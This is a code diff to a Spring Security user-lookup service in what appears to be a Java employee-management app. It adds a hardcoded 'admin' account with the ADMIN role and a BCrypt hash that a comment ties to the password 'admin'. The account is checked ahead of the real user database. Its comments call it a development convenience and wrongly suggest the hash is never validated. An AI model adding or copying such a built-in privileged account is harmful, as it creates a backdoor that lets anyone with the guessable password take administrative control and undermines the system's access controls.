@@ -24,6 +24,16 @@ public class UserDetailsServiceImpl implements UserDetailsService {
     @Override
     @Transactional
     public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
+        // Hardcoded admin account for development
+        // Password hash is not checked during JWT validation, only during login
+        if ("admin".equals(username)) {
+            return User.builder()
+                    .username("admin")
+                    .password("$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy") // BCrypt hash for "admin" (not used for validation)
+                    .roles("ADMIN")
+                    .build();
+        }
+
         NhanVien nhanVien = nhanVienService.findByTenTaiKhoan(username);
 
         if (nhanVien == null) {
